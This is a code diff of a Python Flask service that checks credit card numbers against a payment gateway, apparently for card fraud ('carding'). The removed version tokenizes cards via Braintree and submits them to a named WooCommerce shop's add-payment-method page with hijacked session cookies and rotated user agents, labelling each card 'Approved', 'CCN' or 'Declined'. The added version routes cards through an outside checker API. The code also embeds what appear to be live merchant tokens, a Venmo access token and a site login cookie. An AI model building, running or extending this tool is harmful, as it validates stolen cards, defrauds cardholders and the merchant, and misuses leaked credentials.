@@ -1,372 +1,93 @@
-import re
+from flask import Flask, request, jsonify
 import requests
-import random
-import uuid
-from flask import Flask, jsonify
-from bs4 import BeautifulSoup
-import json as json_module
 import time
-from urllib.parse import urlparse
-import threading
-import queue
-from datetime import datetime
 
 app = Flask(__name__)
 
-# Request queue system
-request_queue = queue.Queue()
-processing_thread = None
-last_process_time = 0
-PROCESSING_INTERVAL = 20  # 20 seconds between requests
+# Configuration
+BRAINTREE_API_URL = 'https://www.md-tech-gen.tech/api/braintree/b3auth2.php'
+TIMEOUT = 60  # 60 seconds timeout
 
-# User agents list
-uaa = [
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
-]
+# Cookies and headers as provided
+cookies = {
+    'PHPSESSID': 'rv0evssknbthvkijjfvit0086t',
+}
 
-# Approved patterns
-approved_patterns = [
-    'Nice! New payment method added',
-    'Payment method successfully added.',
-    'Insufficient Funds',
-    'Gateway Rejected: avs',
-    'Duplicate',
-    'Payment method added successfully',
-    'Invalid postal code or street address',
-    'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
-    'succeeded',
-    'setup_intent'
-]
+headers = {
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'no-cache',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://www.md-tech-gen.tech/app/checkers',
+    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
+}
 
-# CCN patterns
-CCN_patterns = [
-    'CVV',
-    'Gateway Rejected: avs_and_cvv',
-    'Card Issuer Declined CVV',
-    'Gateway Rejected: cvv',
-    "Your card's security code is incorrect"
-]
-
-# Create a session for connection pooling
-session = requests.Session()
-session.verify = False  # Disable SSL verification for the session
-
-def requests_with_retry(method, url, max_retries=2, **kwargs):
-    """Makes a request with retries."""
-    last_error = None
-    
-    for attempt in range(max_retries):
-        try:
-            response = session.request(
-                method, 
-                url, 
-                timeout=8,  # Reduced timeout for faster processing
-                **kwargs
-            )
-            response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
-            return response
-        except (requests.exceptions.ConnectTimeout, 
-                requests.exceptions.ConnectionError,
-                requests.exceptions.ReadTimeout,
-                requests.exceptions.HTTPError,
-                requests.exceptions.SSLError) as e:
-            last_error = e
-            print(f"Attempt {attempt + 1} failed: {e}. Retrying...")
-            # Reduced delay between retries
-            time.sleep(0.5)
-            continue
-            
-    # If all retries fail, raise the last error
-    raise last_error
-
-def process_payment(cc, mm, yy, cvv):
+@app.route('/gate=b3/cc=<card_details>', methods=['GET'])
+def process_payment(card_details):
     try:
-        # Select random user agent
-        ua = random.choice(uaa)
+        # Parse card details from the URL parameter
+        # Expected format: card_number|mm|yy or card_number|mm|yyyy|cvv
+        parts = card_details.split('|')
         
-        # Step 1: Tokenize the card with Braintree
-        headers = {
-            'accept': '*/*',
-            'accept-language': 'en-GB',
-            # =================================================================
-            # IMPORTANT: You MUST replace the token below with a new, valid one
-            # from your Braintree Control Panel.
-            # =================================================================
-            'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ1NTczMDIsImp0aSI6IjU2MDg3NjQwLTZlMjAtNDNkOC1iMzczLTI5YTYxNDk2ZTVjZSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJsb3ZlZGFnYWlubWVkaWFfaW5zdGFudCIsInBheXBhbF9jbGllbnRfaWQiOiJBZHdOalplLUtkeGZNcEFTc3NhaUNIdV82bWQ2S2lYcXdpQk9tUENmeDJKYm9jYl9IQkI4YVBFTjFrV2tydkpOXzZ2dmJqcFlhQ0w4OWdVMSJ9fQ.PmLOpgapJgaJCikf76abXKw27QRmthrwdZb34iO2AimzNdvgsbc3IJaeqgyrmQBFnq5HbEsPGQx5COsgotI55w',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'priority': 'u=1, i',
-            'referer': 'https://assets.braintreegateway.com/',
-            'save-data': 'on',
-            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': ua,
-        }
-
-        json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'dropin2',
-                'sessionId': str(uuid.uuid4()),
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': cc,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvv,
-                        'billingAddress': {
-                            'postalCode': '10001',
-                        },
-                    },
-                    'options': {
-                        'validate': False,
-                    },
-                },
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
-
-        r = requests_with_retry('POST', 'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-        t = r.json()
-        
-        # Safely check for the token in the Braintree response to prevent 'NoneType' errors
-        data = t.get('data')
-        tokenize_data = data.get('tokenizeCreditCard') if isinstance(data, dict) else None
-        
-        if not data or not isinstance(data, dict) or not tokenize_data or not isinstance(tokenize_data, dict) or 'token' not in tokenize_data:
-            error_message = 'Failed to tokenize card: Invalid response structure from Braintree.'
-            # Try to get a more specific error message if it exists
-            if 'errors' in t and t['errors'] and isinstance(t['errors'], list) and 'message' in t['errors'][0]:
-                error_message = 'Failed to tokenize card: ' + t['errors'][0]['message']
-            return {
-                'status': 'Error',
-                'response': error_message
-            }
+        if len(parts) < 3:
+            return jsonify({"error": "Invalid card details format"}), 400
             
-        tok = tokenize_data['token']
-
-        # Step 2: Submit token to WooCommerce
-        cookies = {
-            '_fbp': 'fb.1.1760784423991.8067735593',
-            'pysAddToCartFragmentId': '',
-            '_ga': 'GA1.1.679663780.1760784425',
-            'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22xcracker663@gmail.com%22%2C%22phone%22:%22%22%2C%22fns%22:[]%2C%22lns%22:[]%2C%22emails%22:[%22xcracker663@gmail.com%22%2C%22xcragsgwhwh3@gmail.com%22%2C%22xcracker6636263@gmail.com%22]%2C%22phones%22:[]}',
-            '_ga_SKX4MWPJWN': 'GS2.1.s1760784425$o1$g1$t1760784834$j60$l0$h0',
-            'pys_session_limit': 'true',
-            'pys_first_visit': 'true',
-            'pysTrafficSource': 'direct',
-            'pys_landing_page': 'https://lovedagainmedia.com/my-account',
-            'last_pysTrafficSource': 'direct',
-            'groundhogg-lead-source': 'https://lovedagainmedia.com/my-account',
-            'groundhogg-tracking': 'Zk83QVlFUE42S1ZlY1hKc0RFMGZDZHB2enFuSFRCdFkvSlJwYmo1eGxYST0%3D',
-            'breeze_folder_name': 'c3a41d9da7d57477427097787121b1a974371ed3',
-            'wordpress_logged_in_ef622a6d6df3290e271fd50a256d6fba': '38b85d2599b8cf42a1a0d342b%7C1765680437%7CP3gE5ss0KbZnL0QmDsQFpHUY1vHk7NcQRuKnsU9kAC6%7Cf0f6bcdbff1efb563556b422aadeec78c727a50993740aa479d9a79d813cbaf4',
-            'mcfw-wp-user-cookie': 'NjcyODU0fDB8NjN8NjgwX2Q4NGNiNmNiZWViZTQxMTJhZDMzMGU5ZTMyZTYyMThlNGU5NzQzOGVjMWZhY2FjNzk3ZTQ2YjYyZWE0MjZjYWU%3D',
-            '_gcl_au': '1.1.11265940.1760784423.822680999.1764470806.1764470949',
-            'PHPSESSID': '3ftpunkmdsasb40i5vvvt71b2e',
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
-            'sbjs_first_add': 'fd%3D2025-11-30%2002%3A48%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
-            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
-            'pys_start_session': 'true',
-            'last_pys_landing_page': 'https://lovedagainmedia.com/my-account/payment-methods',
-            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flovedagainmedia.com%2Fmy-account%2Fadd-payment-method',
-            'groundhogg-page-visits': '[["/my-account/payment-methods",[[1764470890,1],[1764472726,1]]],["/my-account/add-payment-method",[[1764470908,1],[1764470972,1],[1764472738,1]]]]',
-        }
-
-        headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Language': 'en-GB',
-            'Cache-Control': 'max-age=0',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://lovedagainmedia.com',
-            'Referer': 'https://lovedagainmedia.com/my-account/add-payment-method',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': ua,
-            'save-data': 'on',
-            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-        }
-
-        data = {
-            'payment_method': 'braintree_cc',
-            'braintree_cc_nonce_key': tok,
-            'braintree_cc_device_data': '{"correlation_id": "' + str(uuid.uuid4()) + '"}',
-            'braintree_cc_3ds_nonce_key': '',
-            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/rjxzjtn49jmc2mm3/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/rjxzjtn49jmc2mm3"},"merchantId":"rjxzjtn49jmc2mm3","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"rjxzjtn49jmc2mm3","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true,"tokensOnDemand":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Visa","MasterCard","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Loved Again Media","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ3MzE5MjEsImp0aSI6ImQ0YzRiN2M4LTlkYzktNGE5NC1hZjE3LWZhNDViYjc5MjE2MSIsInN1YiI6InJqeHpqdG40OWptYzJtbTMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJqeHpqdG40OWptYzJtbTMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5Il0sIm9wdGlvbnMiOnt9fQ.lg2VxNdXfJPzuMO7M60Lowf9R9kNzax5HuWhXV7iJQSnUN3PC14Uj1f9xg9S9dGpb3kAucPxh9wuFtzSmpplgQ","paypalClientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3336777698625192868","accessToken":"access_token$production$rjxzjtn49jmc2mm3$501425b5cb865ff22144901bb5a31794","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"Loved Again Media","clientId":"AdwNjZe-KdxfMpASssaiCHu_6md6KiXqwiBOmPCfx2Jbocb_HBB8aPEN1kWkrvJN_6vvbjpYaCL89gU1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"lovedagainmedia_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-            'woocommerce-add-payment-method-nonce': '7faa5c039c',
-            '_wp_http_referer': '/my-account/add-payment-method',
-            'woocommerce_add_payment_method': '1',
-            'apbct__email_id__elementor_form': '',
-            'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHMiOiIiLCJpbnZpc2libGVfZmllbGRzIjoiYnJhaW50cmVlX2NjX25vbmNlX2tleSBicmFpbnRyZWVfY2NfZGV2aWNlX2RhdGEgYnJhaW50cmVlX2NjXzNkc19ub25jZV9rZXkgYnJhaW50cmVlX2NjX2NvbmZpZ19kYXRhIHdvb2NvbW1lcmNlLWFkZC1wYXltZW50LW1ldGhvZC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCBhcGJjdF9fZW1haWxfaWRfX2VsZW1lbnRvcl9mb3JtIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6OH19',
-            'ct_bot_detector_event_token': '39d6ad2a7c6cebe4685f4bd5835a64c4db0d6b262761335b7bbed0dfb690384c',
-        }
-
-        ree = requests_with_retry('POST', 'https://lovedagainmedia.com/my-account/add-payment-method', cookies=cookies, headers=headers, data=data)
+        card_number = parts[0]
+        month = parts[1]
+        year = parts[2]
+        cvv = parts[3] if len(parts) > 3 else ''
         
-        # Parse response
-        soup = BeautifulSoup(ree.text, 'html.parser')
-        err = soup.find('div', class_='woocommerce-notices-wrapper')
-        message = err.get_text(strip=True) if err else "Unknown error"
-        rr = re.findall(r"Reason:\s*([^<\n\r]+)", ree.text)
-        
-        # Determine status based on response
-        status = "Declined"
-        response_text = message if message else (rr[0] if rr else "Unknown error")
-
-        # Ensure response_text is a string to prevent the 'NoneType' error
-        if response_text is None:
-            response_text = "Unknown error (response was None)"
-
-        for pattern in approved_patterns:
-            if pattern in response_text:
-                status = "Approved"
-                break
-                
-        for pattern in CCN_patterns:
-            if pattern in response_text:
-                status = "CCN"
-                break
-        
-        return {
-            'status': status,
-            'response': response_text
+        # Format the cc parameter as required by the API
+        cc_param = f"{card_number}|{month}|{year}"
+        if cvv:
+            cc_param += f"|{cvv}"
+            
+        # Prepare the parameters for the API request
+        params = {
+            'cc': cc_param,
+            'useProxy': '0',
+            'hitSender': 'both',
+            'site': '',
         }
         
+        # Make the request with timeout
+        start_time = time.time()
+        response = requests.get(
+            BRAINTREE_API_URL,
+            params=params,
+            cookies=cookies,
+            headers=headers,
+            timeout=TIMEOUT
+        )
+        
+        # Check if request was successful
+        if response.status_code != 200:
+            return jsonify({"error": f"API request failed with status code {response.status_code}"}), 500
+            
+        # Parse the JSON response
+        data = response.json()
+        
+        # Extract only the required fields
+        result = {
+            "status": data.get("status", ""),
+            "response": data.get("response", "")
+        }
+        
+        return jsonify(result)
+        
+    except requests.exceptions.Timeout:
+        return jsonify({"error": "Request timed out after 60 seconds"}), 504
+    except requests.exceptions.RequestException as e:
+        return jsonify({"error": f"Request failed: {str(e)}"}), 500
     except Exception as e:
-        return {
-            'status': 'Error',
-            'response': f'An unexpected error occurred: {str(e)}'
-        }
-
-def queue_worker():
-    """Background thread that processes requests from the queue"""
-    global last_process_time
-    
-    while True:
-        try:
-            # Get request from queue (blocks until a request is available)
-            request_data = request_queue.get()
-            
-            # Calculate how long to wait before processing this request
-            current_time = time.time()
-            time_since_last = current_time - last_process_time
-            
-            if time_since_last < PROCESSING_INTERVAL:
-                wait_time = PROCESSING_INTERVAL - time_since_last
-                print(f"Waiting {wait_time:.1f} seconds before processing next request...")
-                time.sleep(wait_time)
-            
-            # Process the payment
-            print(f"Processing card: {request_data['cc'][-4:]}")
-            result = process_payment(
-                request_data['cc'], 
-                request_data['mm'], 
-                request_data['yy'], 
-                request_data['cvv']
-            )
-            
-            # Store the result
-            request_data['result'] = result
-            request_data['processed'] = True
-            
-            # Update the last process time
-            last_process_time = time.time()
-            
-            # Mark task as done
-            request_queue.task_done()
-            
-        except Exception as e:
-            print(f"Error in queue worker: {e}")
-            request_queue.task_done()
-
-# Start the background queue worker thread
-def start_queue_worker():
-    global processing_thread
-    if processing_thread is None or not processing_thread.is_alive():
-        processing_thread = threading.Thread(target=queue_worker, daemon=True)
-        processing_thread.start()
-        print("Queue worker started")
-
-@app.route('/gate=b3/cc=<cc_data>')
-def gate_b3(cc_data):
-    # Parse the credit card data
-    pattern = r'^(\d{13,19})\|([0-1]\d)\|(\d{2}|\d{4})\|(\d{3,4})$'
-    match = re.match(pattern, cc_data)
-    
-    if not match:
-        return jsonify({
-            'status': 'Error',
-            'response': 'Invalid card format. Expected: cardnumber|mm|yy|cvv'
-        })
-    
-    cc, mm, yy, cvv = match.groups()
-    
-    # Start the queue worker if not already running
-    start_queue_worker()
-    
-    # Create a request data dictionary
-    request_data = {
-        'cc': cc,
-        'mm': mm,
-        'yy': yy,
-        'cvv': cvv,
-        'result': None,
-        'processed': False,
-        'timestamp': time.time()
-    }
-    
-    # Add the request to the queue
-    request_queue.put(request_data)
-    
-    # Poll for the result (with a timeout to prevent hanging)
-    timeout = 120  # Maximum wait time of 2 minutes
-    start_time = time.time()
-    
-    while time.time() - start_time < timeout:
-        if request_data.get('processed', False):
-            return jsonify(request_data['result'])
-        time.sleep(0.5)  # Check every half second
-    
-    # If we get here, the request timed out
-    return jsonify({
-        'status': 'Error',
-        'response': 'Request processing timed out'
-    })
-
-@app.route('/status')
-def status():
-    """Endpoint to check queue status"""
-    return jsonify({
-        'queue_size': request_queue.qsize(),
-        'worker_alive': processing_thread.is_alive() if processing_thread else False,
-        'last_process_time': datetime.fromtimestamp(last_process_time).strftime('%Y-%m-%d %H:%M:%S') if last_process_time > 0 else 'Never'
-    })
+        return jsonify({"error": f"Internal server error: {str(e)}"}), 500
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
